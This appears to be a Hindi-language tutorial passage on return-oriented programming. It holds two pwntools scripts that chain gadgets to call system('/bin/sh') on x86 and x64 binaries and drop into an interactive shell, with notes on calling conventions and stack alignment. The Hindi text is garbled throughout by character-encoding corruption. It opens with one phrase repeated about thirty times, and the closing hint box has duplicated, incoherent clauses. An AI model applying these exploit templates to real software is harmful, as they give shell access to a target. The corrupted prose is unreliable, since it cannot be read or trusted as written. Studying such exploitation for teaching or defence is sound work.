‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï ‡§§‡§∞‡•Ä‡§ï‡•á ‡§∏‡•á
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ‡§Ü‡§∞‡§ì‡§™‡•Ä ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ x64

### **x64 (64-‡§¨‡§ø‡§ü) ‡§ï‡•â‡§≤‡§ø‡§Ç‡§ó ‡§ï‡§®‡§µ‡•á‡§Ç‡§∂‡§®**

* ‡§Ø‡•Ç‡§®‡§ø‡§ï‡•ç‡§∏-‡§ú‡•à‡§∏‡•á ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§™‡§∞ **System V AMD64 ABI** ‡§ï‡•â‡§≤‡§ø‡§Ç‡§ó ‡§ï‡§®‡§µ‡•á‡§Ç‡§∂‡§® ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§ú‡§π‡§æ‡§Ç **‡§™‡§π‡§≤‡•á ‡§õ‡§π ‡§™‡•Ç‡§∞‡•ç‡§£‡§æ‡§Ç‡§ï ‡§Ø‡§æ ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§Ü‡§∞‡•ç‡§ó‡•ç‡§Ø‡•Ç‡§Æ‡•á‡§Ç‡§ü ‡§ï‡•ã ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ `RDI`, `RSI`, `RDX`, `RCX`, `R8`, ‡§î‡§∞ `R9` ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§∞‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à**‡•§ ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§Ü‡§∞‡•ç‡§ó‡•ç‡§Ø‡•Ç‡§Æ‡•á‡§Ç‡§ü ‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡§∞ ‡§™‡§æ‡§∞‡§ø‡§§ ‡§ï‡§ø‡§è ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§∞‡§ø‡§ü‡§∞‡•ç‡§® ‡§Æ‡§æ‡§® `RAX` ‡§Æ‡•á‡§Ç ‡§∞‡§ñ‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§
* **Windows x64** ‡§ï‡•â‡§≤‡§ø‡§Ç‡§ó ‡§ï‡§®‡§µ‡•á‡§Ç‡§∂‡§® ‡§Æ‡•á‡§Ç ‡§™‡§π‡§≤‡•á ‡§ö‡§æ‡§∞ ‡§™‡•Ç‡§∞‡•ç‡§£‡§æ‡§Ç‡§ï ‡§Ø‡§æ ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§Ü‡§∞‡•ç‡§ó‡•ç‡§Ø‡•Ç‡§Æ‡•á‡§Ç‡§ü ‡§ï‡•á ‡§≤‡§ø‡§è `RCX`, `RDX`, `R8`, ‡§î‡§∞ `R9` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§Ü‡§∞‡•ç‡§ó‡•ç‡§Ø‡•Ç‡§Æ‡•á‡§Ç‡§ü ‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡§∞ ‡§™‡§æ‡§∞‡§ø‡§§ ‡§ï‡§ø‡§è ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§∞‡§ø‡§ü‡§∞‡•ç‡§® ‡§Æ‡§æ‡§® `RAX` ‡§Æ‡•á‡§Ç ‡§∞‡§ñ‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§
* **‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞**: 64-‡§¨‡§ø‡§ü ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§Æ‡•á‡§Ç `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, ‡§î‡§∞ `R8` ‡§∏‡•á `R15` ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡§Ç‡•§

#### **‡§ó‡•à‡§ú‡•á‡§ü‡•ç‡§∏ ‡§ñ‡•ã‡§ú‡§®‡§æ**

‡§π‡§Æ‡§æ‡§∞‡•á ‡§â‡§¶‡•ç‡§¶‡•á‡§∂‡•ç‡§Ø ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§ö‡§≤‡•ã ‡§π‡§Æ‡•á‡§Ç ‡§â‡§® ‡§ó‡•à‡§ú‡•á‡§ü‡•ç‡§∏ ‡§™‡§∞ ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§ï‡•á‡§Ç‡§¶‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç ‡§ú‡•ã ‡§π‡§Æ‡•á‡§Ç **RDI** ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§Ç‡§ó‡•á (**system()** ‡§ï‡•ã ‡§Ü‡§∞‡•ç‡§ó‡•ç‡§Ø‡•Ç‡§Æ‡•á‡§Ç‡§ü ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç **"/bin/sh"** ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó ‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è) ‡§î‡§∞ ‡§´‡§ø‡§∞ **system()** ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡•á‡§Ç‡§ó‡•á‡•§ ‡§π‡§Æ ‡§Æ‡§æ‡§® ‡§≤‡•á‡§Ç‡§ó‡•á ‡§ï‡§ø ‡§π‡§Æ‡§®‡•á ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ó‡•à‡§ú‡•á‡§ü‡•ç‡§∏ ‡§ï‡•Ä ‡§™‡§π‡§ö‡§æ‡§® ‡§ï‡§∞ ‡§≤‡•Ä ‡§π‡•à:

* **pop rdi; ret**: ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á ‡§∂‡•Ä‡§∞‡•ç‡§∑ ‡§Æ‡§æ‡§® ‡§ï‡•ã **RDI** ‡§Æ‡•á‡§Ç ‡§™‡•â‡§™ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§µ‡§æ‡§™‡§∏ ‡§≤‡•å‡§ü‡§§‡§æ ‡§π‡•à‡•§ **system()** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§π‡§Æ‡§æ‡§∞‡•á ‡§Ü‡§∞‡•ç‡§ó‡•ç‡§Ø‡•Ç‡§Æ‡•á‡§Ç‡§ü ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à‡•§
* **ret**: ‡§ï‡•Å‡§õ ‡§∏‡•ç‡§•‡§ø‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§ü‡•à‡§ï ‡§∏‡§Ç‡§∞‡•á‡§ñ‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§è‡§ï ‡§∏‡§∞‡§≤ ‡§∞‡§ø‡§ü‡§∞‡•ç‡§®‡•§

‡§î‡§∞ ‡§π‡§Æ **system()** ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡§æ ‡§™‡§§‡§æ ‡§ú‡§æ‡§®‡§§‡•á ‡§π‡•à‡§Ç‡•§

### **ROP ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ**

‡§®‡•Ä‡§ö‡•á ‡§è‡§ï ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç **pwntools** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á **x64** ‡§™‡§∞ **system('/bin/sh')** ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§∞‡§ì‡§™‡•Ä ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ ‡§∏‡•á‡§ü ‡§Ö‡§™ ‡§î‡§∞ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Stack Alignment

**x86-64 ABI** ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ï‡§ø **‡§ï‡•â‡§≤ ‡§á‡§Ç‡§∏‡•ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§∂‡§®** ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§§‡•á ‡§∏‡§Æ‡§Ø **‡§∏‡•ç‡§ü‡•à‡§ï 16-‡§¨‡§æ‡§á‡§ü ‡§è‡§≤‡§æ‡§á‡§®‡•ç‡§°** ‡§π‡•ã‡•§ **LIBC**, ‡§™‡•ç‡§∞‡§¶‡§∞‡•ç‡§∂‡§® ‡§ï‡•ã ‡§Ö‡§®‡•Å‡§ï‡•Ç‡§≤‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è **SSE ‡§á‡§Ç‡§∏‡•ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§∂‡§®** (‡§ú‡•à‡§∏‡•á **movaps**) ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§á‡§∏ ‡§è‡§≤‡§æ‡§á‡§®‡§Æ‡•á‡§Ç‡§ü ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø ‡§∏‡•ç‡§ü‡•à‡§ï ‡§∏‡§π‡•Ä ‡§¢‡§Ç‡§ó ‡§∏‡•á ‡§è‡§≤‡§æ‡§á‡§® ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à (‡§Ø‡§æ‡§®‡•Ä **RSP** 16 ‡§ï‡§æ ‡§ó‡•Å‡§£‡§ï ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à), ‡§§‡•ã **ROP ‡§ö‡•á‡§®** ‡§Æ‡•á‡§Ç **system** ‡§ú‡•à‡§∏‡•á ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§´‡§≤‡§§‡§æ ‡§π‡•ã‡§ó‡•Ä‡•§ ‡§á‡§∏‡•á ‡§†‡•Ä‡§ï ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™‡§ï‡•á ROP ‡§ö‡•á‡§® ‡§Æ‡•á‡§Ç **system** ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡•á ‡§∏‡•á ‡§™‡§π‡§≤‡•á ‡§è‡§ï **ret ‡§ó‡•à‡§ú‡•á‡§ü** ‡§ú‡•ã‡§°‡§º‡•á‡§Ç‡•§

## x86 ‡§¨‡§®‡§æ‡§Æ x64 ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§Ö‡§Ç‡§§‡§∞

{% hint style="success" %}
‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø **x64 ‡§™‡§π‡§≤‡•á ‡§ï‡•Å‡§õ ‡§§‡§∞‡•ç‡§ï ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞‡•ç‡§∏ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à**, ‡§á‡§∏‡•á ‡§∏‡§æ‡§ß‡§æ‡§∞‡§£ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•â‡§≤ ‡§ï‡•á ‡§≤‡§ø‡§è x86 ‡§ï‡•Ä ‡§§‡•Å‡§≤‡§®‡§æ ‡§Æ‡•á‡§Ç ‡§ï‡§Æ ‡§ó‡•à‡§ú‡•á‡§ü‡•ç‡§∏ ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§∏‡§π‡•Ä ‡§ó‡•à‡§ú‡•á‡§ü‡•ç‡§∏ ‡§ï‡§æ ‡§™‡§§‡§æ ‡§≤‡§ó‡§æ‡§®‡§æ ‡§î‡§∞ ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§ö‡•á‡§® ‡§ï‡§∞‡§®‡§æ ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§ü‡§ø‡§≤ ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞‡•ç‡§∏ ‡§ï‡•Ä ‡§¨‡§¢‡§º‡•Ä ‡§π‡•Å‡§à ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ ‡§î‡§∞ ‡§¨‡§°‡§º‡•á ‡§™‡§§‡•á ‡§ï‡§æ ‡§Ö‡§Ç‡§§‡§∞‡•ç‡§µ‡§∏‡•ç‡§§‡•Å ‡§Ö‡§Ç‡§§‡§∞‡•ç‡§µ‡§∏‡•ç‡§§‡•Å ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§µ‡§∏‡§∞ ‡§î‡§∞ ‡§ö‡•Å‡§®‡•å‡§§‡§ø‡§Ø‡§æ‡§Å ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§ **x64** ‡§Ü‡§∞‡•ç‡§ï‡§ø‡§ü‡•á‡§ï‡•ç‡§ö‡§∞ ‡§Æ‡•á‡§Ç ‡§¨‡§¢‡§º‡•Ä ‡§π‡•Å‡§à ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞‡•ç‡§∏ ‡§ï‡•Ä ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ ‡§î‡§∞ ‡§¨‡§°‡§º‡•á ‡§™‡§§‡•á ‡§ï‡§æ ‡§Ö‡§Ç‡§§‡§∞‡•ç‡§µ‡§∏‡•ç‡§§‡•Å ‡§Ö‡§Ç‡§§‡§∞‡•ç‡§µ‡§∏‡•ç‡§§‡•Å ‡§µ‡§ø‡§ï‡§∏‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§µ‡§∏‡§∞ ‡§î‡§∞ ‡§ö‡•Å‡§®‡•å‡§§‡§ø‡§Ø‡§æ‡§Å ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∞‡•Ç‡§™ ‡§∏‡•á Return-Oriented Programming (ROP) ‡§ï‡•á ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠ ‡§Æ‡•á‡§Ç‡•§
{% endhint %}
